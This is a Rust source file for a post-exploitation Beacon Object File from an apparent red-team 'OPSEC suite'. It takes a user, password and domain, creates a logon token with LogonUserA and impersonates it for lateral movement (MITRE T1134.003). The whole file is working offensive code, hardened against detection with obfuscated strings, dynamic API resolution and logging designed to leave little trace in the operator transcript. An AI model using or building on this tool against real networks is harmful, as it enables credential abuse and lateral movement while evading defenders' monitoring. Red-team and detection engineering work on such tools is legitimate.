// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
//
//! Create a logon token via `LogonUserA` with `LOGON32_LOGON_NEW_CREDENTIALS`.
//! The resulting token can be used with `ImpersonateLoggedOnUser` for
//! pass-the-hash / overpass-the-hash style lateral movement prep.
//!
//! Args: <user> <password> <domain>
//!
//! OPSEC: user/password/domain are converted to wide at runtime from
//! obfuscated ASCII. Password is secure-zeroed on stack after the call.
//! LUID is logged (not the full username) to avoid Beacon transcript leaks.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1134.003", name: "Access Token Manipulation: Make and Impersonate Token", tactic: "Privilege Escalation" },
];

const LOGON32_LOGON_NEW_CREDENTIALS: u32 = 9;
const LOGON32_PROVIDER_DEFAULT: u32 = 0;

dfr_fn!(
    logon_user_a(
        user: *const i8, domain: *const i8, pass: *const i8,
        logon_type: u32, provider: u32, token: *mut usize,
    ) -> i32,
    module = "advapi32.dll",
    api    = "LogonUserA"
);

dfr_fn!(
    impersonate_logged_on_user(token: usize) -> i32,
    module = "advapi32.dll",
    api    = "ImpersonateLoggedOnUser"
);

dfr_fn!(
    revert_to_self() -> i32,
    module = "advapi32.dll",
    api    = "RevertToSelf"
);

dfr_fn!(
    close_handle(h: usize) -> i32,
    module = "kernel32.dll",
    api    = "CloseHandle"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let user_s   = String::from(parser.get_str());
    let pass_s   = String::from(parser.get_str());
    let domain_s = String::from(parser.get_str());
    let user_s   = user_s.as_str();
    let pass_s   = pass_s.as_str();
    let domain_s = domain_s.as_str();

    if user_s.is_empty() { return Err("usage: make-token <user> <pass> <domain>"); }

    // Build NUL-terminated ASCII buffers on stack
    let mut user_buf   = [0u8; 256];
    let mut pass_buf   = [0u8; 256];
    let mut domain_buf = [0u8; 256];
    if user_s.len() >= user_buf.len() - 1 { return Err("user too long"); }
    if pass_s.len() >= pass_buf.len() - 1 { return Err("pass too long"); }
    if domain_s.len() >= domain_buf.len() - 1 { return Err("domain too long"); }
    user_buf[..user_s.len()].copy_from_slice(user_s.as_bytes());
    pass_buf[..pass_s.len()].copy_from_slice(pass_s.as_bytes());
    domain_buf[..domain_s.len()].copy_from_slice(domain_s.as_bytes());

    let mut token: usize = 0;
    let rc = unsafe {
        logon_user_a(
            user_buf.as_ptr() as *const i8,
            domain_buf.as_ptr() as *const i8,
            pass_buf.as_ptr() as *const i8,
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_DEFAULT,
            &mut token,
        )
    }.map_err(|_| "LogonUserA resolve failed")?;

    // Wipe password immediately after the call
    common::evasion::secure_zero(&mut pass_buf);

    if rc == 0 || token == 0 {
        return Err("LogonUserA failed (bad creds / account locked)");
    }

    let imp = unsafe { impersonate_logged_on_user(token) }.map_err(|_| "ImpersonateLoggedOnUser resolve")?;
    if imp == 0 {
        unsafe { let _ = close_handle(token); };
        return Err("ImpersonateLoggedOnUser failed");
    }

    // Log only a short fingerprint of the user, not the full plaintext.
    let fp = common::hash::djb2(user_s.as_bytes());
    obf! { let ok = "token impersonated"; }
    println!("[+] {} (user-fp=0x{:08x})", ok, fp);

    // Note: we deliberately do NOT close the token here — the caller may
    // need it for subsequent actions. RevertToSelf must be called manually
    // by the operator or by a follow-up BOF.
    Ok(())
}
